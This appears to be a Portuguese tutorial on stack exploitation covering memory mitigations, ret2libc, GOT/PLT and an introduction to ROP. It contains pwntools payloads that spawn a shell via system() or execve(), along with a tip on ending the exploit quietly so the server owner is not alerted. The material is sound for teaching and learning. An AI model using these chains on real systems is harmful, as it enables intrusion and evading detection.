</ul>
</li>
<li><a href="stack/mitigacoes.html#canaries">Canaries</a></li>
<li><a href="stack/mitigacoes.html#outras">Outras</a>
<ul>
<li><a href="stack/mitigacoes.html#linux">Linux</a>
<ul>
<li><a href="stack/mitigacoes.html#pointer-guard">Pointer Guard</a></li>
</ul>
</li>
<li><a href="stack/mitigacoes.html#windows">Windows</a></li>
</ul>
</li>
</ul>
<h1 id="dep--nx--wx"><a class="header" href="#dep--nx--wx">DEP | NX | W^X</a></h1>
<p>Todas essas pretendem impedir a execução de código em 
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o código escrito 
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou 
executável, mas nunca as duas simultaneamente: 
<strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Você vai ouvir pessoas usando os 3 nomes para representar 
esse conceito, e dependendo do contexto não tem problema!</p>
<p>Porem eles são tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados): 
a implementação do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para 
garantir a exclusão mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu não lembro... 
e não importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclusão mutua de escrever e executar 
ocorre por meio de paging: o sistema operacional decide 
as permissões das paginas de memorias, e garante que uma 
não viole W^X . <strong>No momento que você esta lendo, isso 
pode ter mudado!</strong></p>
</blockquote>
<h1 id="system-aslr"><a class="header" href="#system-aslr">System ASLR</a></h1>
<p>ASLR randomiza os endereços das coisas na memoria! Porem 
com as suas limitações, dado que depende doo sistema 
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do executável (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endereço do código não muda!</strong></p>
<h1 id="pie"><a class="header" href="#pie">PIE</a></h1>
<p>Para garantir que o código também tenha sua posição 
randomizada, o binário precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osição) impede 
que o codigo possa ser executado independente da sua<br />
posição na memoria (duh :P)</p>
<p>Para garantir isso, todos endereços precisam ser relativos ao invés de absolutos!</p>
<pre><code>			Endereço	Instrução
Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
			0x0002	add 1 2
			0x0003	add 1 3

Com PIE     ------	jmp EIP+2  &lt;- EIP
			------	add 1 2
			------	add 1 3
</code></pre>
<p>No primeiro caso, se o executável mudar de endereço 
o <code>JMP</code> pularia para a instrução errada, por causa do 
endereço absoluto.</p>
<h1 id="relro"><a class="header" href="#relro">RELRO</a></h1>
<p>Realocacoes Read-only: Dividido em 2 tipos: Parcial e Full</p>
<p>Atualmente, somente o RELRO Parcial vem como padrao no gcc</p>
<ul>
<li>PARCIAL: <code>gcc -Wl,-z,relro</code> ou nenhuma flag, em versoes modernas</li>
<li>FULL: <code>gcc -Wl,-z,relro,-z,now</code></li>
</ul>
<h2 id="parcial"><a class="header" href="#parcial">Parcial</a></h2>
<ul>
<li>As <code>sections</code> de dados do ELF (<code>got</code>,<code>dtors</code>,<code>ctors</code>) precedem as do programa 
(<code>data</code>,<code>bss</code>). Assim, caso tenha um BoF no programa a estrutura do ELF fica 
intacta. </li>
</ul>
<h2 id="full"><a class="header" href="#full">Full</a></h2>
<ul>
<li>Tudo do parcial</li>
<li>Re-Mapeia a GOT como <code>r--</code>, impedindo que a usemos para ganhar execucao.</li>
</ul>
<p>Porem para fazer isso torna-se nescessario pre-resolver todas as calls 
dinamicas. Assim. desativando <code>RTLD_LAZY</code> e consequentemente tornando a 
inicializacao mais lenta.</p>
<p>Da nossa perspectiva, ficamos com opcoes reduzidas para execucao de codigo, 
tendo de usar tecnicas como corromper os <code>malloc hooks</code> ou o <code>vtable</code> pointer 
do <code>stdio</code>. (mais sobre esses no futuro!)</p>
<h2 id="fontes-e-recursos-adicionais"><a class="header" href="#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></h2>
<ul>
<li><a href="https://www.trapkit.de/articles/relro/">trapkit: RELRO A (not so well known) Exploit Mitigation Technique</a></li>
<li><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/em386/Self-Protecting-GOT.html">Self Protecting GOT</a></li>
</ul>
<hr />
<p>TODO</p>
<hr />
<h1 id="canaries"><a class="header" href="#canaries">Canaries</a></h1>
<h1 id="outras"><a class="header" href="#outras">Outras</a></h1>
<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
<h3 id="pointer-guard"><a class="header" href="#pointer-guard">Pointer Guard</a></h3>
<h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/ret2libc.html#ret2libc">Ret2LibC</a></li>
<li><a href="stack/ret2libc.html#fun%C3%A7%C3%B5es-%C3%BAteis">Funções Úteis</a>
<ul>
<li><a href="stack/ret2libc.html#system">System()</a>
<ul>
<li><a href="stack/ret2libc.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
<li><a href="stack/ret2libc.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
<li><a href="stack/ret2libc.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/ret2libc.html#pontos-fracos">Pontos Fracos</a>
<ul>
<li><a href="stack/ret2libc.html#estaticamente-linkado">Estaticamente Linkado</a></li>
<li><a href="stack/ret2libc.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
</ul>
</li>
<li><a href="stack/ret2libc.html#fun%C3%A7%C3%B5es-uteis-pt-2">Funções Uteis Pt 2</a>
<ul>
<li><a href="stack/ret2libc.html#execve--exit">Execve() + Exit()</a></li>
<li><a href="stack/ret2libc.html#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a>
<ul>
<li><a href="stack/ret2libc.html#argumentos">Argumentos</a>
<ul>
<li><a href="stack/ret2libc.html#addr">Addr</a></li>
<li><a href="stack/ret2libc.html#size">Size</a></li>
<li><a href="stack/ret2libc.html#perms">Perms</a></li>
</ul>
</li>
<li><a href="stack/ret2libc.html#classifica%C3%A7%C3%A3o">Classificação</a></li>
<li><a href="stack/ret2libc.html#analise">Analise</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="ret2libc"><a class="header" href="#ret2libc">Ret2LibC</a></h1>
<p>Ret2Libc foi uma técnica desenvolvida para combater W^X. Alem disso, 
ter domínio dessa técnica facilitar a compreensão de ROP. :D </p>
<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos 
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar 
encontrar uma parte executável na memoria! Uma função do próprio programa!</p>
<p>Voce se lembra de quando chamávamos uma <code>call_me()</code> ou <code>win()</code> nos desafios 
iniciais? Então... poderíamos fazer isso... mas ninguém colocaria uma 
função pre-pronta pra nos dar uma shell :(</p>
<p>Felizmente, existe LibC, e dentro dela existem múltiplas funções úteis!</p>
<h1 id="funções-Úteis"><a class="header" href="#funções-Úteis">Funções Úteis</a></h1>
<h2 id="system"><a class="header" href="#system">System()</a></h2>
<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
<p>Para nosso propósito, ela recebe 1 argumento, o caminho do programa para 
executar (Ex: <code>/bin/sh</code>)</p>
<p>Em C:</p>
<pre><code class="language-C">#include &lt;stdlib.h&gt;
int main() {
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>Em assembly:</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;/bin/ls&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
</code></pre>
<p>A função recebe um pointer para a string via <code>rdi</code> (64 bits) ou os 
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32 
bits!</p>
<h4 id="conseguindo-o-pointer-para-binsh"><a class="header" href="#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></h4>
<p>Usando pwntools: </p>
<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
</code></pre>
<p>x sera um pointer contendo o endereço da string <code>/bin/sh</code></p>
<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
<h4 id="layout-da-stack-numa-call-32-bits"><a class="header" href="#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></h4>
<pre><code class="language-x86asm">    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
|____________|   Então da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulnerável a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    Então podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  função que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

</code></pre>
<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo 
(<code>fork</code>, gerando um processo secundário: <code>child_proc</code>)! </p>
<p>Então retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera 
reportado para o processo principal e nao para o computador!</p>
<blockquote>
<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
</blockquote>
<h3 id="unindo-tudo"><a class="header" href="#unindo-tudo">Unindo tudo</a></h3>
<p>Vamos supor que o programa esta vulnerável a um BoF tradicional na função 
<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
</code></pre>
<p>Caso voce esteja com pressa, adios!</p>
<p>Daqui em diante eu vou discutir técnicas alternativas de ret2libc, vantagens 
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender 
ROP! </p>
<h1 id="pontos-fracos"><a class="header" href="#pontos-fracos">Pontos Fracos</a></h1>
<h2 id="estaticamente-linkado"><a class="header" href="#estaticamente-linkado">Estaticamente Linkado</a></h2>
<p>Em programas estaticamente linkados ao libc, somente podemos usar uma 
fração das funções presentes, pois somente as que sao originalmente usadas 
pelo programa sao linkadas!</p>
<h2 id="dinamicamente-linkado--aslr"><a class="header" href="#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></h2>
<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o 
potencial do libc. Porem caso o computador possua ASLR ligado, sera 
necessário primeiro encontrar o endereço aleatório do libc (libc-leak), ou 
executar o exploit em loop ate voce dar sorte (viável somente em 
computadores 32 bits).</p>
<h1 id="funções-uteis-pt-2"><a class="header" href="#funções-uteis-pt-2">Funções Uteis Pt 2</a></h1>
<h2 id="execve--exit"><a class="header" href="#execve--exit">Execve() + Exit()</a></h2>
<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e 
funciona igual <code>System</code>, porem com uma diferença: <code>System</code> cria um novo 
processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em 
<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce 
simplesmente chamar ele, quando voce fechar a shell vai gerar uma 
<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e 
ativando mecanismos de segurança que alertam o dono do servidor!</p>
<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o 
programa finalize silenciosamente!</p>
<p>Alem disso, existe mais uma diferença, <code>execve</code> recebe 3 argumentos:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  execve(&quot;./blablabla&quot;, NULL, NULL);
  return 1;
}
</code></pre>
<p>O primeiro: programa a ser executado</p>
<p>O segundo: argv (poderíamos passar <code>-p</code> para <code>sh</code> manter os privilégios)</p>
<p>O terceiro: envp (environment vars)</p>
<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
<p>Em 64 bits precisaríamos de múltiplos gadgets para salvar um em cada register</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
</code></pre>
<p>Caso voce queira usar argv:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, NULL);
  return 1;
}
</code></pre>
<pre><code class="language-x86asm">.LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, envp);
  return 1;
}}
</code></pre>
<pre><code class="language-x86asm">..LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;env1&quot;
.LC3:
        .string &quot;env2&quot;
.LC4:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>Bem, agora que voce voltou de ficar brincando com a função, vamos voltar a pratica:</p>
<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
</code></pre>
<p>Os argumentos estão sendo passados conforme convenção... mas eu nao posso garantir!</p>
<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, preguiça hehehe :/</p>
<blockquote>
<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima técnica (<code>mprotect</code>) 
sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
</blockquote>
<h2 id="mprotect--ret2shellcode"><a class="header" href="#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a></h2>
<p><code>Mprotect</code> pode ser usado para tornar uma região da memoria <code>RWX</code> novamente!</p>
<p>A funcao recebe 3 argumentos: mprotect(addr, size, perms) </p>
<p>Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da 
direita pra esquerda!</p>
<pre><code>mprotect
ret       -&gt; shellcode
addr
size
perms
</code></pre>
<h3 id="argumentos"><a class="header" href="#argumentos">Argumentos</a></h3>
<h4 id="addr"><a class="header" href="#addr">Addr</a></h4>
<p>O endereço deve ser alinhado ao page_size, assim podemos fazer:</p>
<pre><code class="language-py">((addr &gt;&gt; 4*n) &lt;&lt; 4*n)
</code></pre>
<p>Alinhando o endereço fazendo shift-direita shift-esquerda, 4 por digito hex!</p>
<pre><code class="language-py">&gt;&gt;&gt; hex((0x7ffe23668bf4 &gt;&gt; 12) &lt;&lt; 12 )
'0x7ffe23668000'
</code></pre>
<h4 id="size"><a class="header" href="#size">Size</a></h4>
<p>O valor deve ser multiplo de page_size, exemplo: 
0x1000 em x86_64</p>
<p>Para encontrar esse valor na arquitetura que voce esta usando, basta ler o 
manual (opção chata e 0% descolada) ou usar <code> page_size = getpagesize ();</code> em C</p>
<h4 id="perms"><a class="header" href="#perms">Perms</a></h4>
<p>As permissões sao: <code>PERM_READ, PERM_WRITE,... etcetc</code></p>
<blockquote>
<p>OBS: existem outras permissões relacionadas a memoria privada vs compartilhada etc</p>
</blockquote>
<p>Porem, essas sao somente macros de valor substituídas por <code>ints</code></p>
<blockquote>
<p>read=1 write=2 exec=4</p>
</blockquote>
<p>Assim, para termos todas as permissões, o valor de perms deve ser <code>7</code>!</p>
<h3 id="classificação"><a class="header" href="#classificação">Classificação</a></h3>
<p>Esses tipo de exploit se classifica como: exploit de múltiplas etapas </p>
<p>Assim, tornando a região do nosso shellcode executável, e somente depois 
pulando para ele!
Esses exploits vem se tornando mais e mais comuns conforme novas proteções 
sao adicionadas!</p>
<h3 id="analise"><a class="header" href="#analise">Analise</a></h3>
<p>Porem, essa técnica sera usada predominantemente em SROP 64 bits !</p>
<p>Caso voce nao esteja vendo SROP no momento, pode pular e voltar no futuro!</p>
<p>Eu recomendo que voce pegue o exemplo em <code>man mprotect</code> e brinque com ele + 
<code>strace --trace=mprotect</code> para criar uma intuição!</p>
<p>Eu alterei o meu para ficar assim:</p>
<pre><code class="language-C">#include &lt;fcntl.h&gt;
#include &lt;signal.h&gt;
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;unistd.h&gt;

static int alloc_size;
static char* memory;

// gcc c.c -o c

void segv_handler (int signal_number) 
{
 printf (&quot;memory accessed!\n&quot;);
 mprotect (memory, alloc_size, PROT_READ | PROT_WRITE);
} 

void foo() {
 mprotect (memory, alloc_size, 2);
}

int main ()
{
 int fd;
 struct sigaction sa;

 /* Install segv_handler as the handler for SIGSEGV. */
 memset (&amp;sa, 0, sizeof (sa));
 sa.sa_handler = &amp;segv_handler;
 sigaction (SIGSEGV, &amp;sa, NULL);
 
 /* Allocate one page of memory by mapping /dev/zero. Map the memory
   as write-only, initially. */
 alloc_size = getpagesize ();
 fd = open (&quot;/dev/zero&quot;, O_RDONLY);
 memory = mmap (NULL, alloc_size, PROT_WRITE, MAP_PRIVATE, fd, 0);
 close (fd);

 /* Write to the page to obtain a private copy. */
 memory[0] = 0;

 foo();


 /* Write to the allocated memory region. */
 memory[0] = 1;

 /* All done; unmap the memory. */
 printf (&quot;all done\n&quot;);
 munmap (memory, alloc_size);
 return 0;
}
</code></pre>
<p>Eu coloquei a funcao dentro do <code>foo()</code>, caso o gcc esteja colocando ela inline,
vale a pena checar as flags de otimização!</p>
<p>A funcao fica: </p>
<pre><code class="language-x86asm">   0x00005555555552a7 &lt;+0&gt;:	endbr64 
   0x00005555555552ab &lt;+4&gt;:	push   rbp
   0x00005555555552ac &lt;+5&gt;:	mov    rbp,rsp
   0x00005555555552af &lt;+8&gt;:	mov    eax,DWORD PTR [rip+0x2d63]  # alloc_size
   
b  0x00005555555552b5 &lt;+14&gt;:	movsxd rcx,eax
   
b  0x00005555555552b8 &lt;+17&gt;:	mov    rax,QWORD PTR [rip+0x2d61]  # memory

b  0x00005555555552bf &lt;+24&gt;:	mov    edx,0x2

   0x00005555555552c4 &lt;+29&gt;:	mov    rsi,rcx
   0x00005555555552c7 &lt;+32&gt;:	mov    rdi,rax

b  0x00005555555552ca &lt;+35&gt;:	call   0x555555555150 &lt;mprotect@plt&gt;

   0x00005555555552cf &lt;+40&gt;:	nop
   0x00005555555552d0 &lt;+41&gt;:	pop    rbp
   0x00005555555552d1 &lt;+42&gt;:	ret  
</code></pre>
<p><code>b</code> sao os breakpoints</p>
<p>Em seguida, crie o seguinte gdbscript</p>
<pre><code>disassemble foo

b *foo+14
b *foo+17
b *foo+24
b *foo+35

r
info registers $eax
c
info registers $eax $rcx
c
info registers $rax
c
info registers $edx $rsi $rcx $rdi $rax
</code></pre>
<p>Assim, temos uma visão de todos os registers afetados na funcao! E fica mais 
fácil de brincar com o programa, ver o que causa erro, etcetc....</p>
<pre><code class="language-x86asm">Efetivamente, a funcao recebe:
edx = flags
rsi = page size
rdi = addr

Breakpoint 4, 0x00005555555552ca in foo ()
edx            0x2                 2
rsi            0x1000              4096
rdi            0x7ffff7fc7000      140737353904128
</code></pre>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/gotplt.html#resumo">Resumo</a></li>
<li><a href="stack/gotplt.html#perspectiva-de-atacante">Perspectiva de Atacante</a>
<ul>
<li><a href="stack/gotplt.html#relro-parcial">RELRO Parcial</a></li>
<li><a href="stack/gotplt.html#relro-full">RELRO Full</a></li>
</ul>
</li>
<li><a href="stack/gotplt.html#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></li>
</ul>
<h1 id="resumo"><a class="header" href="#resumo">Resumo</a></h1>
<ul>
<li>
<p>A GOT armazena o endereço da funcao apos ser resolvido!</p>
</li>
<li>
<p>Quando nos chamamos uma funcao do libc, nao estamos chamando elas  diretamente, e sim a sua entrada na PLT.</p>
</li>
<li>
<p>A PLT checa a GOT, caso o endereço ja tenha sido resolvido, <code>jmp</code> la</p>
</li>
<li>
<p>Caso a funcao <strong>NAO</strong> tenha sido chamada e consequentemente o endereço ainda 
nao tenha sido resolvido, coordena com <code>ld.so</code> para resolver!</p>
</li>
</ul>
<pre><code class="language-x86asm">pwndbg&gt; disassemble vuln
        push   rbp
        mov    rbp,rsp
        sub    rsp,0x20
break &gt; lea    rdi,[rip+0xec3]

        call   0x401030 &lt;puts@plt&gt;

break &gt; lea    rax,[rbp-0x20]
        mov    rdi,rax
        mov    eax,0x0
        call   0x401040 &lt;gets@plt&gt;
        nop
        leave  
        ret

pwndbg&gt; b vuln
pwndbg&gt; b *vuln+20

-------------------------------------
- Antes de puts ter sido executada  -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x401036 (puts@plt+6) ◂— push   0 /* 'h' */
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ◂— push   1

pwndbg&gt; disassemble 0x401036
    jmp    QWORD PTR [rip+0x2fe2]        # 0x404018 &lt;puts@got.plt&gt;
    push   0x0
    jmp    0x401020


-------------------------------------
- Depois de puts ter sido executada -
-------------------------------------

pwndbg&gt; got

GOT protection: Partial RELRO | GOT functions: 2
 
[0x404018] puts@GLIBC_2.2.5 -&gt; 0x7ffff7e655f0 (puts) ◂— push   r14
[0x404020] gets@GLIBC_2.2.5 -&gt; 0x401046 (gets@plt+6) ◂— push   1

</code></pre>
<h1 id="perspectiva-de-atacante"><a class="header" href="#perspectiva-de-atacante">Perspectiva de Atacante</a></h1>
<h2 id="relro-parcial"><a class="header" href="#relro-parcial">RELRO Parcial</a></h2>
<p>Caso o RELRO seja parcial, nos podemos alterar o valor na got, fazendo uma call 
ser redirecionada para, por exemplo, um shellcode!</p>
<p>Esse tipo de cenário pode ser encontrado em vulnerabilidades 
<code>escrever-n-bytes---em-algum-lugar</code> !</p>
<p>Alem disso podemos ler ela e obter um leak, descrito no proximo exemplo!</p>
<h2 id="relro-full"><a class="header" href="#relro-full">RELRO Full</a></h2>
<p>Com RELRO Full, nos podemos somente ler a GOT (que ja vem com valores 
pre-resolvidos).</p>
<p>Porem isso se mostra util pois, podemos mandar esse endereco de volta 
( por meio de um <code>puts</code> por exemplo ) e usar esse leak para desativar ASLR!</p>
<p>Ou podemos calcular a distancia dentro do libc entre a <code>funcao do leak</code> e 
<code>system</code>. </p>
<p>Em seguida ajustar esse valor (<code>pop rbp; add rax, rbp</code>, com <code>rax = leak</code>) e chama-lo: <code>call rax</code>, novamente burlando ASLR! :D</p>
<h1 id="analise-a-fundo-plt-e-ldso-todo"><a class="header" href="#analise-a-fundo-plt-e-ldso-todo">Analise A Fundo PLT e ld.so ~TODO~</a></h1>
<div style="break-before: page; page-break-before: always;"></div><h1 id="intro-rop"><a class="header" href="#intro-rop">Intro ROP</a></h1>
<ul>
<li><a href="stack/rop/intro.html#intro-rop">Intro ROP</a></li>
<li><a href="stack/rop/intro.html#teoria">Teoria</a>
<ul>
<li><a href="stack/rop/intro.html#ret">Ret</a></li>
<li><a href="stack/rop/intro.html#gadgets">Gadgets</a></li>
<li><a href="stack/rop/intro.html#chains">Chains</a></li>
</ul>
</li>
<li><a href="stack/rop/intro.html#ferramentas">Ferramentas</a></li>
<li><a href="stack/rop/intro.html#curiosidades">Curiosidades</a></li>
</ul>
<p>ROP (programação orientada ao retorno) foi um técnica desenvolvida 
para burlar todas as limitações e mecanismos de segurança 
impostos no <code>RIP</code>!</p>
<p>Vamos considerar que todas mitigações exceto <code>PIE</code> estão ativas!</p>
<h1 id="teoria"><a class="header" href="#teoria">Teoria</a></h1>
<h2 id="ret"><a class="header" href="#ret">Ret</a></h2>
<p>O que faz o <code>RIP</code> ser especial? Em um nível abstrato, quais sao 
suas propriedades genéricas que o dao sua funcionalidade??</p>
<ul>
<li>[1] ~ O RIP aponta para um endereço na memoria</li>
<li>[2] ~ Em seguida, ele age com base no valor presente</li>
<li>[3] ~ Ele automaticamente avança (aumenta seu endereço)</li>
<li>[4] ~ jmp [1]</li>
</ul>
<p>Existe algum outro que possa operar dessa maneira? Sim! o <code>RSP</code>! </p>
<p>Quando o processador executa <code>RET</code>, o endereço no topo da stack 
(aonde <code>RSP</code> aponta) sera colocado no <code>RIP</code> e o <code>RSP</code> se ajusta: 
<code>RSP += 8</code>! :D</p>
<h2 id="gadgets"><a class="header" href="#gadgets">Gadgets</a></h2>
<p>Um gadget consiste em uma sequencia de instruções, seguidas de um 
<code>RET</code>. Por exemplo:</p>
<pre><code class="language-x86asm">gadget_1:
    mov rax rbx
    mov r12 r13
    ret

gadget_2:
    pop rdi
    pop rbp
    ret

</code></pre>
<p>Vamos supor que apos um BoF, o <code>RIP</code> salvo esta num offset de 40.</p>
<pre><code class="language-py">payload = b&quot;A&quot; * 40
payload += gadget_1
payload += b&quot;B&quot; * 8
</code></pre>
<p>Quando a função vulnerável retornar, o valor no topo da stack sera 
<code>&amp;gadget_1</code></p>
<pre><code class="language-x86asm">vulnerável:             stack:
    ...                 AAAAAAAA
    leave               ...
    ret     &lt;- RIP      AAAAAAAA
                        gadget_1 &lt;- RSP
                        BBBBBBBB


A execução sera redirecionada, e o RSP ira avançar


gadget_1:               stack:
    mov rax rbx &lt;- RIP  AAAAAAAA
